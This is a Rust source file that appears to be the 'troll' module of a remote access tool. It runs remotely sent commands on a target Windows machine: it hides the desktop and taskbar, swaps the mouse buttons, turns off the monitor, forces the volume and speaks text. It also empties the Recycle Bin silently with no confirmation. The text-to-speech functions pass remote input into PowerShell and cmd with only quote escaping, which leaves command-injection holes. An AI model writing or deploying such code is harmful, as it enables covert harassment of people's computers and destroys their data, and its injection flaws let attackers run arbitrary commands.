use common::packets::TrollCommand;
use std::ptr::null_mut;
use winapi::um::winuser::{
    SW_HIDE, SW_SHOW, ShowWindow, FindWindowA, FindWindowExA,
    GetDesktopWindow, SetForegroundWindow, GetShellWindow,
    GetForegroundWindow, keybd_event,
    PostMessageA, SystemParametersInfoA,
    VK_ESCAPE, KEYEVENTF_KEYUP, WM_SYSCOMMAND, SC_MONITORPOWER,
    
    // Add virtual key codes for volume control
    VK_VOLUME_UP, VK_VOLUME_DOWN, VK_VOLUME_MUTE
};
use winapi::shared::minwindef::{TRUE, FALSE};
use std::process::Command;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::iter::once;
use std::thread;
use winapi::um::shellapi::{SHEmptyRecycleBinW, SHERB_NOCONFIRMATION, SHERB_NOPROGRESSUI, SHERB_NOSOUND};

use winapi::um::utilapiset::Beep;

pub fn execute_troll_command(command: &TrollCommand) {
        match command {
            TrollCommand::HideDesktop(_p) => toggle_desktop(false),
            TrollCommand::ShowDesktop(_p) => toggle_desktop(true),
            TrollCommand::HideTaskbar(_p) => toggle_taskbar(false),
            TrollCommand::ShowTaskbar(_p) => toggle_taskbar(true),
            TrollCommand::HideNotify(_p) => toggle_notification_area(false),
            TrollCommand::ShowNotify(_p) => toggle_notification_area(true),
            TrollCommand::FocusDesktop(_p) => focus_desktop(),
            TrollCommand::EmptyTrash(_p) => empty_recycle_bin(),
            TrollCommand::RevertMouse(_p) => toggle_invert_mouse(true),
            TrollCommand::NormalMouse(_p) => toggle_invert_mouse(false),
            TrollCommand::MonitorOff(_p) => toggle_monitor(false),
            TrollCommand::MonitorOn(_p) => toggle_monitor(true),
            TrollCommand::MaxVolume(_p) => max_volume(),
            TrollCommand::MinVolume(_p) => min_volume(),
            TrollCommand::MuteVolume(_p) => mute_volume(),
            TrollCommand::UnmuteVolume(_p) => unmute_volume(),
            TrollCommand::SpeakText(text) => speak_text(text),
            TrollCommand::Beep(freq_duration)=> {
                let freq_duration = freq_duration.split(":").collect::<Vec<&str>>();
                let freq = freq_duration[0].parse::<u32>().unwrap();
                let duration = freq_duration[1].parse::<u32>().unwrap();
                unsafe { Beep(freq, duration); }
            },
            TrollCommand::PianoKey(key) => {
                let key = key.parse::<u32>().unwrap();
                piano_key(key)
            },
        }
}

fn toggle_desktop(show: bool) {
    let visibility = if show { SW_SHOW } else { SW_HIDE };
    
    if !try_toggle_desktop_icons(visibility) && !try_toggle_desktop_window(visibility) {
        {}
    }
}

fn try_toggle_desktop_icons(visibility: i32) -> bool {
    unsafe {
        let prog_man = GetShellWindow();
        if prog_man.is_null() {
            return false;
        }
        
        let shell_view = FindWindowExA(
            prog_man,
            null_mut(),
            b"SHELLDLL_DefView\0".as_ptr() as *const i8,
            null_mut()
        );
        
        if !shell_view.is_null() {
            let desktop_icons = FindWindowExA(
                shell_view,
                null_mut(),
                b"SysListView32\0".as_ptr() as *const i8,
                b"FolderView\0".as_ptr() as *const i8
            );
            
            if !desktop_icons.is_null() {
                ShowWindow(desktop_icons, visibility);
                
                // If showing, also bring to foreground
                if visibility == SW_SHOW {
                    SetForegroundWindow(desktop_icons);
                }
                
                return true;
            }
        }
        
        let mut worker_w = FindWindowExA(
            null_mut(),
            null_mut(),
            b"WorkerW\0".as_ptr() as *const i8,
            null_mut()
        );
        
        while !worker_w.is_null() {
            let shell_view = FindWindowExA(
                worker_w,
                null_mut(),
                b"SHELLDLL_DefView\0".as_ptr() as *const i8,
                null_mut()
            );
            
            if !shell_view.is_null() {
                let desktop_icons = FindWindowExA(
                    shell_view,
                    null_mut(),
                    b"SysListView32\0".as_ptr() as *const i8,
                    b"FolderView\0".as_ptr() as *const i8
                );
                
                if !desktop_icons.is_null() {
                    ShowWindow(desktop_icons, visibility);
                    
                    if visibility == SW_SHOW {
                        SetForegroundWindow(desktop_icons);
                    }
                    return true;
                }
            }
            
            worker_w = FindWindowExA(
                null_mut(),
                worker_w,
                b"WorkerW\0".as_ptr() as *const i8,
                null_mut()
            );
        }
    }
    false
}

fn try_toggle_desktop_window(visibility: i32) -> bool {
    unsafe {
        let mut worker_w = FindWindowExA(
            null_mut(),
            null_mut(),
            b"WorkerW\0".as_ptr() as *const i8,
            null_mut()
        );
        
        while !worker_w.is_null() {
            let shell_view = FindWindowExA(
                worker_w,
                null_mut(),
                b"SHELLDLL_DefView\0".as_ptr() as *const i8,
                null_mut()
            );
            
            if !shell_view.is_null() {
                ShowWindow(worker_w, visibility);
                
                if visibility == SW_SHOW {
                    SetForegroundWindow(worker_w);
                }
                
                return true;
            }
            
            worker_w = FindWindowExA(
                null_mut(),
                worker_w,
                b"WorkerW\0".as_ptr() as *const i8,
                null_mut()
            );
        }
        
        let prog_man = GetShellWindow();
        if !prog_man.is_null() {
            ShowWindow(prog_man, visibility);
            
            // If showing, also bring to foreground
            if visibility == SW_SHOW {
                SetForegroundWindow(prog_man);
            }
            
            return true;
        }
    }
    false
}

fn toggle_taskbar(show: bool) {
    unsafe {
        let taskbar = FindWindowA(b"Shell_TrayWnd\0".as_ptr() as *const i8, null_mut());
        
        if !taskbar.is_null() {
            let visibility = if show { SW_SHOW } else { SW_HIDE };
            ShowWindow(taskbar, visibility);
        }
    }
}

fn toggle_notification_area(show: bool) {
    unsafe {
        let taskbar = FindWindowA(b"Shell_TrayWnd\0".as_ptr() as *const i8, null_mut());
        
        if !taskbar.is_null() {
            let tray_notify_wnd = FindWindowExA(
                taskbar,
                null_mut(),
                b"TrayNotifyWnd\0".as_ptr() as *const i8,
                null_mut()
            );
            
            if !tray_notify_wnd.is_null() {
                let visibility = if show { SW_SHOW } else { SW_HIDE };
                let action_str = if show { "showing" } else { "hiding" };
                
                ShowWindow(tray_notify_wnd, visibility);
                return;
            }
        }
    }
}

fn focus_desktop() {
    unsafe {
        const VK_LWIN: u8 = 0x5B;
        const VK_D: u8 = 0x44;
        
        keybd_event(VK_LWIN, 0, 0, 0);
        keybd_event(VK_D, 0, 0, 0);
        keybd_event(VK_D, 0, KEYEVENTF_KEYUP, 0);
        keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
        
        thread::sleep(std::time::Duration::from_millis(100));
        
        let desktop_window = GetDesktopWindow();
        if !desktop_window.is_null() {
            SetForegroundWindow(desktop_window);
            keybd_event(VK_ESCAPE as u8, 0, 0, 0);
            keybd_event(VK_ESCAPE as u8, 0, KEYEVENTF_KEYUP, 0);
        }
    }
}

fn empty_recycle_bin() {
    unsafe {
        let null_string: Vec<u16> = OsStr::new("")
            .encode_wide()
            .chain(once(0))
            .collect();
        
        let _result = SHEmptyRecycleBinW(
            null_mut(),
            null_string.as_ptr(),
            SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND
        );
    }
}

fn toggle_invert_mouse(invert: bool) {
    unsafe {
        const SPI_SETMOUSEBUTTONSWAP: u32 = 0x0021;
        
        let swap_value = if invert { TRUE } else { FALSE };
        
        let result = SystemParametersInfoA(
            SPI_SETMOUSEBUTTONSWAP,
            swap_value as u32,
            null_mut(),
            0
        );
        
        if result != TRUE {
            let value = if invert { "1" } else { "0" };
            let _output = Command::new("cmd")
                .args(["/C", &format!("reg add \"HKCU\\Control Panel\\Mouse\" /v SwapMouseButtons /t REG_SZ /d {} /f", value)])
                .output();
        }
    }
}

fn toggle_monitor(on: bool) {
    unsafe {
        let power_state = if on { -1 } else { 2 };
        
        // 1. Try using the foreground window
        let foreground_window = GetForegroundWindow();
        if !foreground_window.is_null() {
            // Use PostMessage instead of SendMessage for better results
            PostMessageA(
                foreground_window,
                WM_SYSCOMMAND,
                SC_MONITORPOWER as usize,
                power_state as isize
            );
        }
        
        // 2. Also try with desktop window
        let desktop_window = GetDesktopWindow();
        if !desktop_window.is_null() {
            PostMessageA(
                desktop_window,
                WM_SYSCOMMAND,
                SC_MONITORPOWER as usize,
                power_state as isize
            );
        }
        
        // 3. Try a fallback method by calling a PowerShell script for Windows 10+
        if !on {
            let ps_script = r#"
                Add-Type -TypeDefinition '
                using System;
                using System.Runtime.InteropServices;
                public class MonitorControl {
                    [DllImport("user32.dll")]
                    public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
                    public static void TurnOffMonitor() {
                        SendMessage(-1, 0x112, 0xF170, 2);
                    }
                }
                '
                [MonitorControl]::TurnOffMonitor()
            "#;
            
            let _output = Command::new("powershell.exe")
                .args(["-NoProfile", "-Command", ps_script])
                .output();
        }
    }
}

fn mute_volume() {
    unsafe {
        keybd_event(VK_VOLUME_MUTE as u8, 0, 0, 0);
        keybd_event(VK_VOLUME_MUTE as u8, 0, KEYEVENTF_KEYUP, 0);
        thread::sleep(std::time::Duration::from_millis(100));
    }
}

fn unmute_volume() {
    unsafe {
        keybd_event(VK_VOLUME_MUTE as u8, 0, 0, 0);
        keybd_event(VK_VOLUME_MUTE as u8, 0, KEYEVENTF_KEYUP, 0);
        thread::sleep(std::time::Duration::from_millis(100));
    }
}

fn max_volume() {
    unmute_volume();
    thread::sleep(std::time::Duration::from_millis(100));
    
    unsafe {
        for _ in 0..50 {
            keybd_event(VK_VOLUME_UP as u8, 0, 0, 0);
            keybd_event(VK_VOLUME_UP as u8, 0, KEYEVENTF_KEYUP, 0);
            thread::sleep(std::time::Duration::from_millis(20));
        }
    }
}

fn min_volume() {
    unmute_volume();
    thread::sleep(std::time::Duration::from_millis(100));
    
    unsafe {
        for _ in 0..50 {
            keybd_event(VK_VOLUME_DOWN as u8, 0, 0, 0);
            keybd_event(VK_VOLUME_DOWN as u8, 0, KEYEVENTF_KEYUP, 0);
            thread::sleep(std::time::Duration::from_millis(20));
        }
    }
}

fn speak_text(text: &str) {    
    let ps_text = text.replace("\"", "\\\""); // Escape quotes for PowerShell
    let ps_script = format!(
        "Add-Type -AssemblyName System.Speech; \
         $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; \
         $speak.Speak(\"{}\")", 
        ps_text
    );
    
    match Command::new("powershell.exe")
        .args(["-Command", &ps_script])
        .spawn() {
        Ok(_) => {},
        Err(e) => {
            speak_text_with_sapi(text);
        }
    }
}

fn speak_text_with_sapi(text: &str) {
    let vbs_text = text.replace("\"", "\"\""); // Escape quotes for VBScript
    let vbs_script = format!(
        "CreateObject(\"SAPI.SpVoice\").Speak \"{}\"", 
        vbs_text
    );
    
    match Command::new("cmd.exe")
        .args(["/c", "echo", &vbs_script, ">", "temp_speech.vbs", "&&", "cscript", "//nologo", "temp_speech.vbs", "&&", "del", "temp_speech.vbs"])
        .spawn() {
        Ok(_) => {},
        Err(_e) => {},
    }
}

fn key_to_midi(key: u32) -> Option<u32> {
    match key {
        1 => Some(71), // B4
        2 => Some(70), // A#4
        3 => Some(69), // A4 (440Hz)
        4 => Some(68), // G#4
        5 => Some(67), // G4
        6 => Some(66), // F#4
        7 => Some(65), // F4
        8 => Some(64), // E4
        9 => Some(63), // D#4
        10 => Some(62), // D4
        11 => Some(61), // C#4
        12 => Some(60), // C4 (Middle C)
        _ => None,
    }
}

fn midi_to_freq(midi: u32) -> u32 {
    let freq = 440.0 * 2f64.powf((midi as f64 - 69.0) / 12.0);
    freq.round() as u32
}


pub fn piano_key(key: u32) {
    if let Some(midi) = key_to_midi(key) {
        let freq = midi_to_freq(midi);
        unsafe {
            Beep(freq, 300);
        }
    }
}